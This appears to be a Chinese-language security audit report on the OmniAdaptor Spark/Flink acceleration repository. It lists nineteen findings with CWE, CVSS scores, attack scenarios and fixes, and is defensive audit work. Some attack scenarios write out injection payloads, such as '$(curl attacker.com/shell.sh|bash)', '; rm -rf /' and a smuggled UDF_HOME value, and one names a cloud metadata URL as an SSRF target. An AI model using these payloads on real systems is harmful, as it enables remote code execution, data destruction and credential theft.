# OmniAdaptor 安全审查报告

**项目**: openEuler OmniAdaptor — Kunpeng 大数据适配加速框架  
**代码仓**: `C:\Users\汪恒生\Desktop\whsprogram\kunpeng-high\kunppengcode\OmniAdaptor`  
**审查日期**: 2026-06-13  
**审查范围**: 全仓约 1267 文件（Scala ~400+, Java ~80+, Python ~50+, C++ ~10, 配置/构建文件若干）  
**排除规则**: DOS/资源耗尽、磁盘凭证、速率限制、加固缺失、理论竞态、第三方库漏洞、测试文件、置信度 < 7  

---

## 项目概况

OmniAdaptor 包含三大子系统：

| 子系统 | 语言 | 功能 |
|--------|------|------|
| `omnioperator/omniop-spark-extension` | Scala + Java + C++ | Spark 列式算子加速扩展 |
| `omnistream/omniop-flink-extension` | Java + C++ | Flink 流处理加速扩展 |
| `omnihelper` | Python | 日志解析、SQL 函数分析、迁移评估工具 |

---

## 发现汇总

| # | 漏洞类型 | 严重程度 | CWE | CVSS | 置信度 | 文件 |
|---|---------|---------|-----|------|--------|------|
| 1 | 命令注入 | 高 | CWE-78 | 9.8 | 9/10 | NativeMain.java |
| 2 | 不安全反序列化 | 高 | CWE-502 | 9.8 | 9/10 | NettyMessage.java |
| 3 | 缓冲区溢出（缺少负值检查） | 高 | CWE-787 | 8.1 | 9/10 | splitter.cpp |
| 4 | 整数溢出导致缓冲区溢出 | 高 | CWE-190/787 | 7.8 | 8/10 | splitter.cpp |
| 5 | 命令注入 | 高 | CWE-78 | 8.0 | 7/10 | AI4C.java |
| 6 | 不安全临时文件 / TOCTOU | 高 | CWE-377 | 7.8 | 8/10 | NativeLoader.java |
| 7 | 任意类加载 / 反射调用 | 高 | CWE-470/749 | 8.8 | 8/10 | ReflectionUtils.java |
| 8 | 路径遍历 | 高 | CWE-22 | 7.5 | 7/10 | NativeMain.java |
| 9 | JNI FindClass 未检查 NULL | 高 | CWE-476 | 6.5 | 8/10 | jni_common.cpp |
| 10 | Use-After-Free | 高 | CWE-416 | 7.5 | 8/10 | MapFunction.cpp |
| 11 | 可执行路径替换注入 | 高 | CWE-78 | 7.2 | 8/10 | spark_log_parser.py |
| 12 | URL 路径注入 / SSRF | 高 | CWE-918 | 7.5 | 8/10 | flink_request.py |
| 13 | 未初始化内存读取 | 中 | CWE-908 | 5.5 | 7/10 | SparkJniWrapper.cpp |
| 14 | 整数溢出导致缓冲区溢出 | 中 | CWE-190/787 | 5.3 | 7/10 | common.h |
| 15 | 类型混淆 / 不安全 reinterpret_cast | 中 | CWE-843 | 5.5 | 7/10 | ReduceFunction.cpp |
| 16 | 悬空指针 / Use-After-Free 风险 | 中 | CWE-416 | 5.5 | 7/10 | MapFunction.cpp |
| 17 | 不安全回退库加载 | 中 | CWE-426 | 5.5 | 7/10 | NativeLoader.java |
| 18 | SSRF（用户可控基础 URL） | 中 | CWE-918 | 5.5 | 7/10 | flink_request.py |
| 19 | 内部基础设施信息泄露 | 中 | CWE-200 | 5.3 | 8/10 | LogsParser.scala |

---

# 发现 1：命令注入：`omnistream/omniop-flink-extension/java/src/main/java/com/huawei/omniruntime/flink/client/NativeMain.java:34-35,73`

* 严重程度：高
* 类别：OS Command Injection
* CWE：CWE-78
* CVSS 评分：9.8
* CVSS 向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
* 描述：`NativeMain.getConfig()` 方法将用户提交的 JAR 路径 `jobJarPath` 直接拼接进 shell 命令字符串 `"bash " + prefix + "/bin/udf_translate.sh " + jobJarPath + " flink"`，随后通过 `Runtime.getRuntime().exec(scriptPath)` 以单字符串形式执行。由于 `Runtime.exec(String)` 会将整个字符串交给 shell 解释器处理，shell 元字符（`;`、`|`、`$()`、反引号等）完全可被利用，导致任意命令执行。
* 攻击场景：攻击者提交恶意 JAR 路径如 `; rm -rf /` 或 `$(curl attacker.com/shell.sh|bash)`，Flink 作业提交接口将此路径传递到 `NativeMain.getConfig()`，shell 命令被注入并以 Flink 进程权限执行任意系统命令，实现远程代码执行（RCE）。
* 修复建议：使用 `ProcessBuilder` 并以参数数组形式传递命令，避免 shell 解释器介入：`new ProcessBuilder("bash", prefix + "/bin/udf_translate.sh", jobJarPath, "flink").start()`。同时验证 `jobJarPath` 为合法文件路径且不包含 shell 元字符。
* 置信度：9/10

---

# 发现 2：不安全反序列化：`omnistream/omniop-flink-extension/java/src/main/java/org/apache/flink/runtime/io/network/netty/NettyMessage.java:507-508`

* 严重程度：高
* 类别：Deserialization of Untrusted Data
* CWE：CWE-502
* CVSS 评分：9.8
* CVSS 向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
* 描述：`NettyMessage.ErrorResponse.readFrom()` 方法从 Netty 网络通道缓冲区读取数据后，直接使用 `ObjectInputStream.readObject()` 反序列化任意 Java 对象，没有任何类白名单过滤或 `ObjectInputFilter`。虽然第 510 行在反序列化完成后检查 `obj instanceof Throwable`，但此时对象已在反序列化过程中被实例化，攻击者可在反序列化阶段触发任意 gadget chain。
* 攻击场景：网络上的攻击者向 Flink TaskManager 的 Netty 通道发送精心构造的序列化数据（利用 Commons Collections、Spring 等 gadget chain），在 `readObject()` 执行期间触发任意类加载和方法调用，实现远程代码执行（RCE）。
* 修复建议：实现 `ObjectInputFilter` 白名单，仅允许 `Throwable` 及其子类通过反序列化；或替换 Java 序列化为安全的序列化格式（如 JSON/Protobuf）。
* 置信度：9/10

---

# 发现 3：缓冲区溢出（缺少负值检查）：`omnioperator/omniop-spark-extension/cpp/src/shuffle/splitter.cpp:41-48`

* 严重程度：高
* 类别：Out-of-bounds Write
* CWE：CWE-787
* CVSS 评分：8.1
* CVSS 向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
* 描述：`Splitter::ComputeAndCountPartitionId()` 中对分区 ID `pid` 仅检查 `pid >= num_partitions_`，但未检查 `pid < 0`。`pid` 为 `int32_t`（有符号），负值将通过上界检查，导致 `partition_id_cnt_cur_[pid]`、`partition_id_cnt_cache_[pid]` 等数组越界写入（写入数组起始位置之前的内存）。负值 `pid` 还传播至后续所有使用它作为数组索引的代码（SplitFixedWidthValueBuffer 等），引发级联缓冲区溢出。
* 攻击场景：通过 JNI 传入的哈希向量包含负值（恶意构造或数据损坏），绕过部分边界检查，在多个堆分配数组之前的位置写入，破坏相邻堆元数据或数据结构，可能实现任意代码执行。
* 修复建议：在 `pid >= num_partitions_` 检查旁增加 `pid < 0` 检查：`if (pid < 0 || pid >= num_partitions_)`。
* 置信度：9/10

---

# 发现 4：整数溢出导致缓冲区溢出：`omnioperator/omniop-spark-extension/cpp/src/shuffle/splitter.cpp:77,82`

* 严重程度：高
* 类别：Integer Overflow or Wraparound
* CWE：CWE-190 / CWE-787
* CVSS 评分：7.8
* CVSS 向量：CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
* 描述：`Splitter::AllocatePartitionBuffers()` 中分配大小计算 `new_size * (1 << column_type_id_[i])` 在 `int32_t` 算术下执行。对于 `SHUFFLE_8BYTE`（column_type_id_ = 3, 移位 = 8），当 `new_size >= 2^28` 时乘法结果超过 INT32_MAX 并回绕为负值或小正值。分配器接收溢出后的小值并分配小缓冲区，但代码随后写入 `new_size` 行 × 8 字节的数据到该小缓冲区，导致大规模堆溢出。
* 攻击场景：攻击者通过 Java 层传入极大的 `buffer_size`（`jint` 来自 Java），触发整数溢出，导致小分配 + 大写入 = 堆损坏。
* 修复建议：将乘法运算提升为 `int64_t`：`static_cast<int64_t>(new_size) * (1LL << column_type_id_[i])`，并在分配前检查结果是否超过 INT32_MAX。
* 置信度：8/10

---

# 发现 5：命令注入：`omnistream/omniop-flink-extension/java/src/main/java/com/huawei/omniruntime/flink/client/AI4C.java:40`

* 严重程度：高
* 类别：OS Command Injection
* CWE：CWE-78
* CVSS 评分：8.0
* CVSS 向量：CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
* 描述：`AI4C.activeAi4c()` 方法调用 `NativeMain.execute("bash " + cpp_path + "/ai4c.sh")`，其中 `cpp_path` 由 `prefix + "/cpp/" + hash` 组成。`hash` 来自 JAR 内容的 SHA-256，较难直接操控，但 `prefix` 来自环境变量 `UDF_HOME`。如果攻击者能操控 `UDF_HOME` 环境变量或在文件系统中植入恶意文件，则可注入 shell 命令。`Runtime.exec(String)` 单字符串形式同样存在 shell 元字符注入风险。
* 攻击场景：在共享环境或容器部署中，攻击者修改 `UDF_HOME` 环境变量为包含 shell 元字符的值（如 `/opt;curl attacker.com|bash#`），触发命令注入。
* 修复建议：同发现 1，使用 `ProcessBuilder` 参数数组形式执行命令，并对 `prefix`/`cpp_path` 进行路径合法性验证。
* 置信度：7/10

---

# 发现 6：不安全临时文件 / TOCTOU：`omnioperator/omniop-spark-extension/spark-extension-core/src/main/java/com/huawei/boostkit/spark/jni/NativeLoader.java:58-66`

* 严重程度：高
* 类别：Insecure Temporary File
* CWE：CWE-377 / CWE-374
* CVSS 评分：7.8
* CVSS 向量：CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
* 描述：`NativeLoader` 构造函数使用 `File.createTempFile()` 创建临时文件来提取并加载原生库 `spark_columnar_plugin.so`。存在两个安全问题：1) 从创建临时文件到 `System.load()` 之间存在 TOCTOU 窗口，本地攻击者可替换临时文件为恶意共享库；2) `NativeLoader.class.getResourceAsStream()` 可能返回 `null`（当资源不在 classpath 中），代码未检查 `null`，导致 `NullPointerException`，随后回退到 `System.loadLibrary(LIBRARY_NAME)` 从 `java.library.path` 加载库——该路径可能被攻击者操控。
* 攻击场景：1) 本地攻击者在 TOCTOU 窗口内用符号链接替换临时 .so 文件，`System.load()` 加载恶意共享库实现本地代码执行；2) 攻击者操控 `java.library.path` 使回退加载从攻击者控制的路径加载恶意库。
* 修复建议：使用 `Files.createTempFile()` 设置严格权限（仅所有者可读写），在加载前验证文件完整性（如校验 SHA-256），添加 `InputStream` null 检查，移除不安全的 `System.loadLibrary` 回退。
* 置信度：8/10

---

# 发现 7：任意类加载 / 反射调用：`omnistream/omniop-flink-extension/java/src/main/java/com/huawei/omniruntime/flink/utils/ReflectionUtils.java:156-211`

* 严重程度：高
* 类别：Externally-Controlled Input to Select Classes / Exposed Dangerous Method
* CWE：CWE-470 / CWE-749
* CVSS 评分：8.8
* CVSS 向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
* 描述：`ReflectionUtils.invokeStaticMethod()` 和 `ReflectionUtils.constructInstance()` 接受 `className` 字符串参数，通过 `Thread.currentThread().getContextClassLoader().loadClass(className)` 加载并实例化任意类，结合 `setAccessible(true)` 绕过所有 Java 访问控制。此外 `retrievePrivateField`、`setPrivateField`、`invokeMethod` 也使用 `setAccessible(true)` 绕过封装。如果任何调用者传入用户可控的 `className` 或 `methodName`，攻击者可实例化危险类（如 `ProcessBuilder`、`ScriptEngineManager`）或调用任意方法，导致远程代码执行。
* 攻击场景：若有代码路径将用户输入（如配置参数、REST API 参数）传递至 `invokeStaticMethod` 或 `constructInstance` 的 `className` 参数，攻击者可指定 `java.lang.ProcessBuilder` 或其他危险类实现 RCE。`setAccessible(true)` 模式本身允许绕过安全边界修改内部对象状态。
* 修复建议：限制 `invokeStaticMethod`/`constructInstance` 仅接受预验证的内部白名单类名。禁止从外部输入直接传入 `className`。考虑移除 `setAccessible(true)` 或仅在严格控制的场景下使用。
* 置信度：8/10

---

# 发现 8：路径遍历：`omnistream/omniop-flink-extension/java/src/main/java/com/huawei/omniruntime/flink/client/NativeMain.java:186-189`

* 严重程度：高
* 类别：Path Traversal
* CWE：CWE-22
* CVSS 评分：7.5
* CVSS 向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
* 描述：`NativeMain.copyResourceDirToNativeDir()` 方法从用户提交的 JAR 文件中提取条目到本地目录。过滤条件 `!entryName.contains("/") && !entryName.contains("\\")` 仅阻止包含路径分隔符的条目，但允许纯 `..` 作为条目名。当 `entry.getName()` 为 `".."` 时，`nativeDir.resolve("..")` 将解析到 nativeDir 的父目录，JAR 条目内容被写入到预期目录之外的位置。
* 攻击场景：攻击者构造恶意 JAR 文件，包含名为 `..` 的条目，该条目内容被写入 nativeDir 的父目录，可能覆盖关键系统文件或注入恶意代码。
* 修复建议：增加对 `..` 的显式检查：`if (!entry.isDirectory() && !entryName.contains("/") && !entryName.contains("\\") && !entryName.equals(".."))`。或使用 `nativeDir.resolve(entryName).normalize()` 并验证规范化路径仍以 `nativeDir` 为前缀。
* 置信度：7/10

---

# 发现 9：JNI FindClass 未检查 NULL：`omnioperator/omniop-spark-extension/cpp/src/jni/jni_common.cpp:58-59`

* 严重程度：高
* 类别：NULL Pointer Dereference
* CWE：CWE-476
* CVSS 评分：6.5
* CVSS 向量：CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H
* 描述：`CreateGlobalClassReference()` 函数中 `env->FindClass(class_name)` 可能返回 NULL（类未找到时），但代码未检查返回值，直接调用 `env->NewGlobalRef(local_class)` 和 `env->DeleteLocalRef(local_class)`。JNI 规范中对 NULL 参数调用 `NewGlobalRef` 是未定义行为，可能导致 JVM 崩溃。此函数在 `JNI_OnLoad` 中用于初始化所有全局类引用（`runtimeExceptionClass`、`splitResultClass`、`jsonClass` 等），任一类缺失即导致整个 JNI 库初始化失败并崩溃。
* 攻击场景：部署环境缺少 JSON 库 JAR 时，`FindClass("org/json/JSONObject")` 返回 NULL，`NewGlobalRef(NULL)` 触发未定义行为，JVM 进程崩溃。攻击者若能操控 classpath 可触发此条件。
* 修复建议：在 `FindClass` 后添加 NULL 检查：`if (local_class == nullptr) { env->ThrowNew(...); return nullptr; }`。
* 置信度：8/10

---

# 发现 10：Use-After-Free：`omnistream/omniop-flink-extension/java/src/main/resources/ai4c/ai4c-cpp/com_huawei_qinwei_JDFlinkWordCount_lambda_main_eccf3286_2_org_apache_flink_api_common_functions_MapFunction.cpp:30-40`

* 严重程度：高
* 类别：Use-After-Free
* CWE：CWE-416
* CVSS 评分：7.5
* CVSS 向量：CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
* 描述：`MapFunction::map()` 方法中，类成员 `result`（`StringView*`）通过 `result->setData(output.data())` 指向 `std::string output` 的内部缓冲区。当 `output.resize(totalLen)` 触发内部缓冲区重新分配时（`totalLen > output.capacity()`），之前的内部缓冲区被释放。如果 Flink 运行时仍在引用前一次 `map()` 返回的 `result`，此时 `result` 指向已释放的内存——典型的 use-after-free。
* 攻击场景：Flink 运行时管道缓冲一次 `map()` 的结果，同时通过同一 MapFunction 实例处理下一个输入，第二次调用触发 `output.resize()` 重新分配，缓冲的结果成为悬空指针，读取已释放堆内存，可能泄露敏感数据或被利用进行堆攻击。
* 修复建议：将 `result` 指向独立分配的缓冲区而非 `output.data()`，或在每次 `map()` 返回前深拷贝数据到新分配的内存。
* 置信度：8/10

---

# 发现 11：可执行路径替换注入：`omnihelper/spark_log_parser.py:95-109`

* 严重程度：高
* 类别：OS Command Injection
* CWE：CWE-78
* CVSS 评分：7.2
* CVSS 向量：CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
* 描述：`LogParser.parse_single_file()` 使用 `subprocess.Popen([java_path, "-cp", class_path, ...])` 执行 Java 程序。`java_path` 和 `class_path` 来自 CLI 参数 `--java-path` 和 `--class-path`，未经任何验证。虽然使用列表形式（非 `shell=True`）避免了 shell 元字符注入，但攻击者可将 `java_path` 替换为任意可执行文件路径，实现任意程序执行。
* 攻击场景：在自动化管道或 Web 服务调用场景中，攻击者通过 `--java-path /path/to/malicious_binary` 指定恶意可执行文件，该文件以当前用户权限执行任意操作。
* 修复建议：验证 `java_path` 解析为合法 Java 二进制（检查文件名包含 `java`/`javaw`，验证为存在的可执行文件）。验证 `class_path` 仅包含预期的 JAR 文件。
* 置信度：8/10

---

# 发现 12：URL 路径注入 / SSRF：`omnihelper/flink/flink_request.py:214,245`

* 严重程度：高
* 类别：Server-Side Request Forgery
* CWE：CWE-918
* CVSS 评分：7.5
* CVSS 向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
* 描述：`FlinkRequester.get_job_detail()` 和 `get_vertex_metrics()` 使用 f-string 将 `jid` 和 `vid` 直接插值到 URL 路径中（`f"jobs/{jid}"` 和 `f"jobs/{jid}/vertices/{vid}/metrics"`），然后通过 `urljoin(self.base_url, endpoint)` 构建 URL。恶意 `jid` 值如 `"../config"` 或 `"../../overview"` 会被 `urljoin` 解析为路径遍历，将 HTTP 请求重定向到非预期的 Flink REST API 端点。
* 攻击场景：攻击者提供恶意 `jid` 值如 `"../config"`，`urljoin("http://flink-server:8081", "jobs/../config")` 解析为 `http://flink-server:8081/config`，绕过 `jobs/` 路径限制，访问配置、指标或管理端点。
* 修复建议：对 `jid` 和 `vid` 进行严格正则验证（Flink job ID 格式 `[a-f0-9]{32}`），使用 `urllib.parse.quote` 编码路径组件，或使用 `urlunsplit` 构建URL而非 f-string 拼接。
* 置信度：8/10

---

# 发现 13：未初始化内存读取：`omnioperator/omniop-spark-extension/cpp/src/jni/SparkJniWrapper.cpp:57-58`

* 严重程度：中
* 类别：Use of Uninitialized Memory
* CWE：CWE-908
* CVSS 评分：5.5
* CVSS 向量：CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L
* 描述：`nativeMake()` JNI 函数中 `new uint32_t[size]`（不带括号）对 `inputDataPrecisions` 和 `inputDataScales` 进行默认初始化，C++ 标准规定整型默认初始化值为不定值。仅 DECIMAL64/DECIMAL128 类型的索引被显式初始化（第 59-63 行），非 decimal 类型列的数组元素保持未初始化状态。当 `splitter.cpp` 中对 decimal 列调用 `vt->set_precision(input_col_types.inputDataPrecisions[indexSchema])` 时，若存在类型分类错误将非 decimal 列误判为 decimal，将读取未初始化的堆数据作为 precision/scale 值。
* 攻击场景：类型混淆 bug 或 `inputVecTypeIds` 数据损坏导致非 decimal 列通过 decimal 类型检查，读取未初始化堆数据作为 precision/scale，导致下游 decimal 运算结果错误（数据损坏）。
* 修复建议：使用 `new uint32_t[size]()` 或 `memset` 将数组全部初始化为零：`uint32_t *inputDataPrecisions = new uint32_t[size]();`
* 置信度：7/10

---

# 发现 14：整数溢出导致缓冲区溢出：`omnioperator/omniop-spark-extension/cpp/src/common/common.h:59-61,74`

* 严重程度：中
* 类别：Integer Overflow or Wraparound
* CWE：CWE-190 / CWE-787
* CVSS 评分：5.3
* CVSS 向量：CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L
* 描述：`BytesGen` 模板函数中 `offsets` 数组使用 `int32_t` 元素。偏移值通过累加每行字符串长度计算（`offsets[i] = offsets[i-1] + lst[i-1].get_vc_len()`）。当 VCBatchInfo 中所有行的二进制数据总量超过 INT32_MAX（~2GB）时，累积偏移回绕（整数溢出），变为负值或小正值。溢出的偏移值随后作为 `memcpy_s((char *)(values + offsets[i]), ...)` 的目标地址，导致写入到 `values` 缓冲区的错误位置（负偏移写入缓冲区起始之前，小正偏移在缓冲区内回绕），造成堆损坏。
* 攻击场景：包含极长 varchar/char 数据的 shuffle 分区（总数据量 > 2GB）触发偏移溢出，损坏 `values` 缓冲区相邻的堆内存。
* 修复建议：将 `offsets` 数组类型改为 `int64_t`，或添加溢出检查：当累积偏移接近 INT32_MAX 时拒绝处理并抛出异常。
* 置信度：7/10

---

# 发现 15：类型混淆 / 不安全 reinterpret_cast：`omnistream/omniop-flink-extension/java/src/main/resources/ai4c/ai4c-cpp/com_huawei_qinwei_JDFlinkWordCount_lambda_main_8119522c_1_org_apache_flink_api_common_functions_ReduceFunction.cpp:11-18`

* 严重程度：中
* 类别：Type Confusion
* CWE：CWE-843
* CVSS 评分：5.5
* CVSS 向量：CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L
* 描述：`ReduceFunction::reduce()` 中所有对象下行转换使用 `reinterpret_cast<Tuple2*>(t1)` 和 `reinterpret_cast<Long*>(f1)` 而无任何类型检查。如果 Flink 运行时传入错误类型的对象（如 `String` 替代 `Tuple2`），`reinterpret_cast` 会错误解读对象内存布局，访问 `tuple1->f0`、`tuple1->f1` 在错误偏移处读取/写入内存，导致内存损坏。相同模式存在于所有 Flink C++ 文件中（MapFunction.cpp、KeySelector.cpp）。
* 攻击场景：Flink 算子链中的类型接线错误导致传入错误类型对象，`reinterpret_cast` 错误解读内存，可能将任意内存读取为指针字段（f0、f1）并跟随这些指针，导致任意内存访问。
* 修复建议：添加运行时类型检查（如 `dynamic_cast` 或自定义类型标记），确保对象类型与预期一致后再进行下行转换。
* 置信度：7/10

---

# 发现 16：悬空指针 / Use-After-Free 风险：`omnistream/omniop-flink-extension/java/src/main/resources/ai4c/ai4c-cpp/com_huawei_qinwei_JDFlinkWordCount_lambda_main_eccf3286_1_org_apache_flink_api_common_functions_MapFunction.cpp:19-25`

* 严重程度：中
* 类别：Use-After-Free
* CWE：CWE-416
* CVSS 评分：5.5
* CVSS 向量：CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L
* 描述：`MapFunction::map()` 中 `split(origin_str, " ")` 返回指向输入对象 `obj` 内部数据的 `string_view` 对象。`strBuffer->setValue(strings[0])` 使 `strBuffer` 直接指向输入对象的数据缓冲区。如果 Flink 运行时在 `strBuffer` 被消费之前释放或回收输入对象，`strBuffer` 将持有悬空指针，后续访问为 use-after-free。
* 攻击场景：Flink 流处理框架常见的对象缓冲区复用优化可能导致输入对象数据缓冲区在下游算子仍引用 `strBuffer` 时被覆盖或释放，造成数据损坏或崩溃。
* 修复建议：将 `strBuffer` 的数据深拷贝到独立分配的缓冲区，避免引用输入对象的内部数据。
* 置信度：7/10

---

# 发现 17：不安全回退库加载：`omnioperator/omniop-spark-extension/spark-extension-core/src/main/java/com/huawei/boostkit/spark/jni/NativeLoader.java:68-70`

* 严重程度：中
* 类别：Insecure Library Loading
* CWE：CWE-426
* CVSS 评分：5.5
* CVSS 向量：CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L
* 描述：`NativeLoader` 构造函数中，当从 JAR 加载原生库失败时（`InputStream` 为 null 或 IO 异常），catch 块回退到 `System.loadLibrary(LIBRARY_NAME)` 从 `java.library.path` 系统属性搜索并加载库。攻击者若能操控 `java.library.path` 或在库搜索路径中放置恶意共享库，可劫持库加载过程实现本地代码执行。
* 攻击场景：攻击者在 `java.library.path` 指向的目录中放置恶意 `spark_columnar_plugin.so`，当 JAR 内原生库缺失或损坏时，`System.loadLibrary` 加载恶意版本，在 Spark executor 中执行任意原生代码。
* 修复建议：移除 `System.loadLibrary` 回退路径，在 JAR 内库加载失败时直接抛出异常终止。确保原生库始终从受控来源加载。
* 置信度：7/10

---

# 发现 18：SSRF（用户可控基础 URL）：`omnihelper/flink/flink_request.py:80` 及 `omnihelper/flink_log_parser.py:264-289`

* 严重程度：中
* 类别：Server-Side Request Forgery
* CWE：CWE-918
* CVSS 评分：5.5
* CVSS 向量：CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
* 描述：`FlinkRequester.__init__()` 的 `base_url` 参数来自 CLI `--url` 参数。`flink_log_parser.py` 中的 URL 验证仅检查结构和协议格式，未执行域名白名单验证或限制为内部 Flink 服务器地址。在自动化管道或服务包装调用场景中，攻击者可通过 `--url` 参数将 HTTP 请求定向到任意内部或外部服务器，访问防火墙后的内部服务或云元数据端点（如 AWS `http://169.254.169.254/latest/meta-data/`）。
* 攻击场景：攻击者指定 `--url http://169.254.169.254/latest/meta-data/`，FlinkRequester 向云元数据端点发送请求，泄露云基础设施凭证（IAM 角色密钥等）。
* 修复建议：实现域名/IP 白名单验证，限制 `base_url` 仅指向合法 Flink 服务器地址。阻断对 RFC 1918 私有 IP 范围、回环地址和云元数据端点的请求。如工具仅面向可信管理员 CLI 使用，明确文档约束。
* 置信度：7/10

---

# 发现 19：内部基础设施信息泄露：`omnihelper/omnimv-spark-extension/log-parser/src/main/scala/org/apache/spark/deploy/history/LogsParser.scala:405-456`

* 严重程度：中
* 类别：Information Exposure
* CWE：CWE-200
* CVSS 评分：5.3
* CVSS 向量：CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
* 描述：`LogsParser.scala` 中多处错误/帮助消息包含内部基础设施主机名和端口信息：`"hdfs://server1:9000/spark2-history"` 和 `"hdfs://server1:9000/logParser"`。这些消息在参数缺失时打印到 stdout，可见于日志、CLI 输出和支持票据中。泄露了内部命名模式（`server1`）、HDFS Namenode RPC 端口（9000）及目录结构（`/spark2-history`、`/logParser`）。
* 攻击场景：获取源代码访问（Git 泄露、公开仓库、内部威胁）的攻击者学习内部命名规范和 Hive Metastore/HDFS 服务端口，用于后续侦察和网络扫描。
* 修复建议：使用通用占位符示例（如 `hdfs://your-namenode:8020/`）替代真实内部主机名。
* 置信度：8/10

---

## 附录：审查范围与统计

| 语言 | 非测试源文件数 | 关键扫描区域 |
|------|-------------|-------------|
| Scala | ~300+ | spark-extension-core, spark-extension-shims, omnimv-spark-extension |
| Java | ~80+ | Flink extension core, Spark JNI/压缩, Netty, PackagedProgram |
| Python | ~50 | omnihelper 全部（解析器、请求器、工具） |
| C++ | ~10 | JNI wrapper, splitter, common, Buffer, ai4c-cpp |
| 配置 | ~30+ | pom.xml, build.sh, properties, JSON 资源 |

**扫描方法**：静态代码分析，模式匹配 + 数据流追踪 + 手动代码审查  
**无发现区域**：所有 Python 文件无 `pickle.loads`/`eval`/`exec`/`os.system`；所有 Scala 文件无 `sys.process`/硬编码凭证；所有 pom.xml/JSON/CSV 资源文件无密码/密钥/令牌
